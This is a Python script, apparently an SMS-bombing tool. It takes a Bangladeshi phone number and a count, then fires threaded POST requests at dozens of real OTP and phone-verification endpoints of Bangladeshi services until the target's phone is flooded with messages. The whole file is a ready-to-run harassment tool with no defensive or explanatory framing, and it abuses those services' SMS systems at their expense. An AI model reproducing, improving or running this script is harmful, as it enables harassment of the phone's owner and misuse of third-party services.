import requests
import time
import threading

bd_number = input("\033[91m[?] Enter BD Number (Ex: 018xxxxxxxx): \033[0m")
amount = int(input("\033[94m[?] Enter Amount of SMS to send: \033[0m"))
full_number = "+88" + bd_number if not bd_number.startswith("+88") else bd_number

apis = [
    "https://auth.shikho.com/api/v1/otp/send",
    "https://api.quizgiri.xyz/api/v3/send-otp",
    "https://api.10minuteschool.com/v1/sms-verification/send",
    "https://www.bdtickets.com:443/bdtickets/api/otp/send",
    "https://api.bikroy.com/users/otp/send",
    "https://api.evaly.com.bd/v1/auth/login",
    "https://api.shohoz.com/api/v2/send-otp",
    "https://api.chaldal.com/v1/otp/send",
    "https://api.foodpanda.com.bd/v1/otp",
    "https://api.busbd.com.bd/api/auth",
    "https://api.shikho.tech/api/v1/users/otp",
    "https://web.shikho.com/api/v1/otp/send",
    "https://app.bongo.bd/api/v1/send-otp",
    "https://api.busbd.com.bd/api/auth",
    "https://api.pathao.com/user/login",
    "https://api.pickaboo.com/v1/otp/send",
    "https://api.shikho.com/auth/v2/send/sms",
    "https://login.bikroy.com/otp/send",
    "https://api.jatri.co/api/v1/user/verify-phone",
    "https://api.shohoz.com.bd/api/auth/otp",
    "https://api.busbd.com.bd/api/auth",
    "https://api.busbd.com.bd/api/auth",
    "https://api.busbd.com.bd/api/auth",
    "https://api.busbd.com.bd/api/auth",
    "https://api.kotha.live/api/v1/otp/send",
    "https://api.busbd.com.bd/api/auth",
    "https://api.busbd.com.bd/api/auth",
    "https://api.busbd.com.bd/api/auth",
    "https://api.chorki.com/v1/send-verification",
    "https://api.walcart.com/v1/otp/send",
    "https://api.toffee.com.bd/api/send-otp",
    "https://api.deshbiz.com/api/v1/send-otp",
    "https://api.getrocket.com.bd/send/otp",
    "https://api.deliverytiger.com.bd/v1/verify-phone",
    "https://api.busbd.com.bd/api/auth",
    "https://api.ajkerdeal.com/otp/send",
    "https://developer.quizgiri.xyz/api/v2.0/send-otp",
    "https://api.busbd.com.bd/api/auth"
]

success_count = 0
lock = threading.Lock()
stop_flag = False

def send_sms(api_url, phone):
    global success_count, stop_flag
    if stop_flag:
        return
    try:
        response = requests.post(api_url, data={"phone": phone}, timeout=5)
        if response.status_code in [200, 201, 202]:
            with lock:
                success_count += 1
                print(f"\033[92m[+] Success ({success_count})\033[0m")
                if success_count >= amount:
                    stop_flag = True
    except:
        pass  # কিছু দেখাবে না

print(f"\n[=] Bombing Started on {full_number}")
print("[=] Press CTRL + C to stop.\n")

while not stop_flag:
    for api in apis:
        if stop_flag:
            break
        t = threading.Thread(target=send_sms, args=(api, full_number))
        t.start()
    time.sleep(1)